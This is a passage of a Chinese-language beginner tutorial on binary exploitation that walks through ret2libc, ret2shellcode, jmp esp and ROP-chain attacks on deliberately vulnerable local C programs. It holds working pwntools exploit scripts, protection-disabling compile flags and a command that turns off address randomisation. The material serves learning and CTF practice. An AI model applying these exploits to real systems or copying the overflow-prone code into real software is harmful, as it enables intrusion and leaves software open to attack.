class="line"></span><br><span class="line"><span class="meta">pwndbg&gt;</span> cyclic -l aaga</span><br><span class="line">22</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/offset.jpg" alt><br>偏移：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&quot;t.exe&quot;)</span><br><span class="line">e=ELF(&quot;t.exe&quot;)</span><br><span class="line">lib=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">va_sh=lib.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">va_system=lib.symbols[&quot;system&quot;]</span><br><span class="line">va_gets=lib.symbols[&quot;gets&quot;]</span><br><span class="line">print hex(va_sh)+&quot;  &quot;+hex(va_system)+&quot;  &quot;+hex(va_gets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr_gets=e.plt[&quot;gets&quot;]</span><br><span class="line">addr_gets2=e.got[&quot;gets&quot;]</span><br><span class="line">print hex(addr_gets)</span><br><span class="line">print hex(addr_gets2)</span><br><span class="line"></span><br><span class="line">addr_strcpy=e.plt[&quot;strcpy&quot;]</span><br><span class="line">addr_strcpy2=e.got[&quot;strcpy&quot;]</span><br><span class="line">print hex(addr_strcpy)</span><br><span class="line">print hex(addr_strcpy2)</span><br><span class="line"></span><br><span class="line">addr_puts=e.plt[&quot;puts&quot;]</span><br><span class="line">addr_puts2=e.got[&quot;puts&quot;]</span><br><span class="line">print hex(addr_puts)</span><br><span class="line">print hex(addr_puts2)</span><br><span class="line"></span><br><span class="line">addr_read=e.plt[&quot;read&quot;]</span><br><span class="line">addr_read2=e.got[&quot;read&quot;]</span><br><span class="line">print hex(addr_read)</span><br><span class="line">print hex(addr_read2)</span><br><span class="line"></span><br><span class="line">addr_write=e.plt[&quot;write&quot;]</span><br><span class="line">addr_write2=e.got[&quot;write&quot;]</span><br><span class="line">print hex(addr_write)</span><br><span class="line">print hex(addr_write2)</span><br><span class="line"></span><br><span class="line">addr_scanf=e.plt[&quot;__isoc99_scanf&quot;]</span><br><span class="line">addr_scanf2=e.got[&quot;__isoc99_scanf&quot;]</span><br><span class="line">print hex(addr_scanf)</span><br><span class="line">print hex(addr_scanf2)</span><br><span class="line"></span><br><span class="line">addr_start=e.plt[&quot;__libc_start_main&quot;]</span><br><span class="line">addr_start2=e.got[&quot;__libc_start_main&quot;]</span><br><span class="line">print hex(addr_start)</span><br><span class="line">print hex(addr_start2)</span><br><span class="line">p.sendline(&quot;ddddddddddd&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line">p=process(<span class="string">"./9.exe"</span>)</span><br><span class="line">e=ELF(<span class="string">".9.exe"</span>)</span><br><span class="line">addr_write=e.plt[<span class="string">"write"</span>]</span><br><span class="line">addr_gets=e.got[<span class="string">"gets"</span>]</span><br><span class="line">addr_vul=e.symbols[<span class="string">"vul"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pidof(p)</span><br><span class="line">offset=<span class="number">22</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">'a'</span>+p32(addr_write)+p32(addr_vul)+p32(<span class="number">1</span>)+p32(addr_gets)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#填充'a'，然后跳转到write函数地址。write函数的返回地址用vul函数覆盖，write函数的参数为"1, gets函数地址, 4"</span></span><br><span class="line">p.sendlineafter(<span class="string">"sinxx"</span>,payload1)</span><br><span class="line">gets_real_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line">rva_libc=gets_real_addr-libc.symbols[<span class="string">"gets"</span>]</span><br><span class="line">addr_system=rva_libc+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">addr_binsh=rva_libc+libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=offset*<span class="string">'a'</span>+p32(addr_system)+p32(<span class="number">0</span>)+p32(addr_binsh)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><p>思路：<br>read函数存在溢出，payload组成为shellcode和nop导轨，补齐到retn返回地址后，把返回地址用全局变量str1的地址覆盖，就跳转到全局变量str1的地址了，就执行了shellcode。</p>
+<h2 id="利用pwntools中shellcraft-sh-函数生成shellcode"><a href="#利用pwntools中shellcraft-sh-函数生成shellcode" class="headerlink" title="利用pwntools中shellcraft.sh()函数生成shellcode"></a>利用pwntools中shellcraft.sh()函数生成shellcode</h2><h3 id="全局变量绝对地址"><a href="#全局变量绝对地址" class="headerlink" title="全局变量绝对地址"></a>全局变量绝对地址</h3><p>C程序：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char str1[0x40];</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">	char str[0x40];</span><br><span class="line">	read(0,str,0x60);</span><br><span class="line">	strcpy(str1,str);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	func();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>全局变量空间不会马上释放，且地址是常规的。</p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -no-pie -fno-stack-protector -z execstack -o 6.exe 6.c</span><br><span class="line">gdb 6.exe</span><br></pre></td></tr></table></figure></p>
+<p>调试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; start</span><br><span class="line">pwndbg&gt; cyclic 200   //生成200字符的串</span><br><span class="line">pwndbg&gt; r   //重新开始</span><br><span class="line">pwndbg&gt; c   //持续执行</span><br><span class="line">（粘贴字符串）</span><br><span class="line">pwndbg&gt; cyclic -l taaa //返回地址得到的字符串计算偏移</span><br></pre></td></tr></table></figure></p>
+<p>python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&apos;./6.exe&apos;)</span><br><span class="line">offset = 76</span><br><span class="line"># linux生成shellcode并转换成机器码</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"># shellcode长度不足偏移地址（76byte）的话用\x90补齐，最后加上全局变量str1的地址覆盖返回地址。</span><br><span class="line">payload =shellcode.ljust(offset,&apos;\x90&apos;)+p32(0x804c060)</span><br><span class="line">pid=proc.pidof(p)</span><br><span class="line">print pid</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="jmp-esp跳板定位相对地址"><a href="#jmp-esp跳板定位相对地址" class="headerlink" title="jmp esp跳板定位相对地址"></a>jmp esp跳板定位相对地址</h3><p>C语言代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">void exploit()</span><br><span class="line">&#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">	char str1[0x40];</span><br><span class="line">   read(0,str1,0x80);  </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">   func();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>思路：详见《堆溢出简单实验》中关于jmp esp的解释。</p>
+<p>关闭linux空间地址随机化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p>
+<p>否则找到的<code>jmp esp</code>就失效了。</p>
+<p>peda命令asmsearch寻找<code>jmp esp</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asmsearch &quot;jmp esp&quot; libc</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/jmpesp.png" alt></p>
+<p>python代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">p=process(&apos;./8.exe&apos;)</span><br><span class="line">offset = 76</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">add_jmpesp=p32(0xf7dd733d)</span><br><span class="line">print len(shellcode)</span><br><span class="line">payload =&apos;\x90&apos;*offset+add_jmpesp+shellcode</span><br><span class="line">pid=proc.pidof(p)</span><br><span class="line">print pid</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>大佬的视频：<a href="https://www.bilibili.com/video/BV1QJ411G7GW" target="_blank" rel="noopener">ret2Shellcode-CTF-PWN入门02</a></p>
+<h1 id="ropgadget"><a href="#ropgadget" class="headerlink" title="ropgadget"></a>ropgadget</h1><p>ROP（Return-Oriented Programming, 返回导向编程）<br>ret2syscall 即控制程序执行系统调用来获取 shell</p>
+<h2 id="ROP链的构造"><a href="#ROP链的构造" class="headerlink" title="ROP链的构造"></a>ROP链的构造</h2><blockquote>
+<p>RWX段（同linux的文件属性一样，对于分页管理的现代操作系统的内存页来说，每一页也同样具有可读(R)，可写(W)，可执行(X)三种属性。只有在某个内存页具有可读可执行属性时，上面的数据才能被当做汇编指令执行，否则将会出错）<br>调试运行后发现这个RWX段其实就是栈，且程序还泄露出了buf所在的栈地址既然攻击者们能想到在RWX段内存页中写入shellcode并执行，防御者们也能想到，因此，一种名为NX位（No eXecute bit）的技术出现了。</p>
+<p>这是一种在CPU上实现的安全技术，这个位将内存页以数据和指令两种方式进行了分类。<br>被标记为数据页的内存页（如栈和堆）上的数据无法被当成指令执行，即没有X属性。由于该保护方式的使用，之前直接向内存中写入shellcode执行的方式显然失去了作用。</p>
+<p>因此，我们就需要学习一种著名的绕过技术——ROP（Return-Oriented Programming, 返回导向编程）<br>使用返回指令ret连接代码的一种技术（同理还可以使用jmp系列指令和call指令，有时候也会对应地成为JOP/COP）。一个程序中必然会存在函数，而有函数就会有ret指令。我们知道，ret指令的本质是pop eip，即把当前栈顶的内容作为内存地址进行跳转。</p>
+<p>而ROP就是利用栈溢出在栈上布置一系列内存地址，每个内存地址对应一个gadget，即以ret/jmp/call等指令结尾的一小段汇编指令，通过一个接一个的跳转执行某个功能。由于这些汇编指令本来就存在于指令区，肯定可以执行，而我们在栈上写入的只是内存地址，属于数据，所以这种方式可以有效绕过NX保护。</p>
+</blockquote>
+<h2 id="linux系统调用"><a href="#linux系统调用" class="headerlink" title="linux系统调用"></a>linux系统调用</h2><p>想办法调用execve(“/bin/sh”,null,null)</p>
+<blockquote><p>linux上面的系统调用原理</p>
+<p>eax 系统调用号<br>ebx 第一个参数<br>ecx 第二个参数<br>edx 第三个参数<br>esi 第四个参数<br>edi 第五个参数<br>int 0x80</p>
+</blockquote>
+<p><strong>把对应获取 shell 的系统调用的参数放到对应的寄存器中，再执行</strong><code>int 0x80</code><strong>就可执行对应的系统调用。</strong><br>控制这些寄存器的值就需要使用 gadgets。我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以需要一段一段控制，这也是在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，可以使用 ropgadgets 这个工具。</p>
+<p>查找<code>execve</code>的系统调用号：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/execve.png" alt></p>
+<p><a href="https://blog.csdn.net/qq_29343201/article/details/52209588" target="_blank" rel="noopener">linux下的系统调用号</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eax=0xb</span><br><span class="line">ebx=&quot;/bin/sh&quot;的地址</span><br><span class="line">ecx=0</span><br><span class="line">edx=0</span><br></pre></td></tr></table></figure>
+<p>只需要让栈顶的值是 0xb 然后可以通过 pop eax 达到目的。其余寄存器也是。</p>
+<p>C代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">0x20</span>];</span><br><span class="line">	read(<span class="number">0</span>,str,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fno-stack-protector -static -o 7.exe 7.c</span><br><span class="line">注：-static 此选项将禁止使用动态库，所以，编译出来的东西，一般都很大，也不需要什么动态连接库，就可以运行。</span><br></pre></td></tr></table></figure></p>
+<p>确定offset<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span> pattern create 100</span><br><span class="line">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span><br><span class="line"><span class="meta">gdb-peda$</span> start</span><br><span class="line"><span class="meta">gdb-peda$</span> r</span><br><span class="line">Starting program: /root/exp/7.exe </span><br><span class="line"><span class="meta">AAA%</span>AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line"><span class="meta">gdb-peda$</span> pattern offset AFAA</span><br><span class="line">AFAA found at offset: 44</span><br></pre></td></tr></table></figure></p>
+<p>寻找需要的gadgets：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali430:~/exp# ROPgadget --binary ./7.exe --only 'pop|ret' | grep 'eax'</span><br><span class="line">0x080a4cea : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08057144 : pop eax ; pop edx ; pop ebx ; ret</span><br><span class="line">0x080aaa06 : pop eax ; ret</span><br><span class="line">0x080a4ce9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali430:~/exp# ROPgadget --binary ./7.exe --only "pop|ret" | grep "ebx" | grep "ecx" | grep "edx"</span><br><span class="line">0x0806f711 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali430:~/exp# ROPgadget --binary ./7.exe --string "/bin/sh"</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080ae008 : /bin/sh</span><br><span class="line">0x080ae7b1 : /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali430:~/exp# ROPgadget --binary ./7.exe --only "int"|grep "0x80"</span><br><span class="line">0x0804a3d2 : int 0x80</span><br></pre></td></tr></table></figure></p>
+<p>python代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line">p=process(<span class="string">'./7.exe'</span>)</span><br><span class="line">offset = <span class="number">44</span></span><br><span class="line">add_eax=p32(<span class="number">0x080aaa06</span>)</span><br><span class="line">value_eax=p32(<span class="number">0xb</span>)</span><br><span class="line">add_edx_ecx_ebx=p32(<span class="number">0x0806f711</span>)</span><br><span class="line">value_ebx=p32(<span class="number">0x080ae008</span>)</span><br><span class="line">value_ecx=p32(<span class="number">0</span>)</span><br><span class="line">value_edx=p32(<span class="number">0</span>)</span><br><span class="line">add_int=p32(<span class="number">0x0804a3d2</span>)</span><br><span class="line">payload =offset*<span class="string">'\x90'</span>+add_eax+value_eax+add_edx_ecx_ebx+value_edx+value_ecx+value_ebx+add_int</span><br><span class="line">pid=proc.pidof(p)</span><br><span class="line"><span class="keyword">print</span> pid</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>找到的另一种代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""ctf-wiki上的"""</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./rop'</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080aaa06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806f711</span></span><br><span class="line">int_0x80 = <span class="number">0x0804a3d2</span></span><br><span class="line">binsh = <span class="number">0x080ae008</span></span><br><span class="line">payload = flat([<span class="string">'A'</span> * <span class="number">44</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line"><span class="comment">#flat模块能将pattern字符串和地址结合并且转为字节模式</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="定位溢出点、python加载的方法"><a href="#定位溢出点、python加载的方法" class="headerlink" title="定位溢出点、python加载的方法"></a>定位溢出点、python加载的方法</h1><p>gdb调试定位溢出点的三种工具。原理都是寻找被覆盖的返回地址在字符串中的偏移。当然还可以直接看汇编在堆栈中分配了多少空间，再加上4（ebp的内存单元）就是总溢出点的偏移。<br><!--more--></p>
+<h2 id="C程序："><a href="#C程序：" class="headerlink" title="C程序："></a>C程序：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">20</span>];</span><br><span class="line">	read(<span class="number">0</span>,str,<span class="number">50</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"the str is:%s\n"</span>,str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	func();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译命令：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fno-stack-protector -z execstack -m32 -o <span class="number">3</span>.exe <span class="number">3</span>.c</span><br></pre></td></tr></table></figure></p>
+<p><strong>-no-pie</strong>：关闭地址随机化<br><strong>-fno-stack-protector</strong>：禁用栈保护<br><strong>-z execstack</strong>：关闭堆栈不可执行</p>
+<p><img src="/2020/04/08/pwn入门学习/编译.png" alt></p>
+<p>寻找代码段中用了哪些函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objdump -j .text -t 3.exe|grep read</span><br><span class="line">objdump -j .text -t 3.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/04/08/pwn入门学习/dw_objdump1.png" alt></p>
+<p>查看反汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -D -M intel 3.exe</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/dw_objdump2.png" alt></p>
+<p>查找函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -D -M intel 3.exe|grep system</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/dw_objdump3.png" alt><br><img src="/2020/04/08/pwn入门学习/dw_objdump4.png" alt></p>
+<p>即system函数的入口是0x8049050，调用system函数的exploit函数入口是0x08049182。<br>当然这是在关闭地址随机化和存在<code>system(&quot;/bin/sh&quot;)</code>的条件下进行的，如果打开了随机化或者找不到<code>system</code>函数或者他的参数就是另一个故事了。</p>
+<h2 id="0x02-生成字符串"><a href="#0x02-生成字符串" class="headerlink" title="0x02 生成字符串"></a>0x02 生成字符串</h2><h3 id="msf-pattern-create"><a href="#msf-pattern-create" class="headerlink" title="msf-pattern_create"></a>msf-pattern_create</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 100</span><br></pre></td></tr></table></figure>
+<p>peda里执行3.exe<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/exp/3.exe </span><br><span class="line">a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2020/04/08/pwn入门学习/溢出点.png" alt></p>
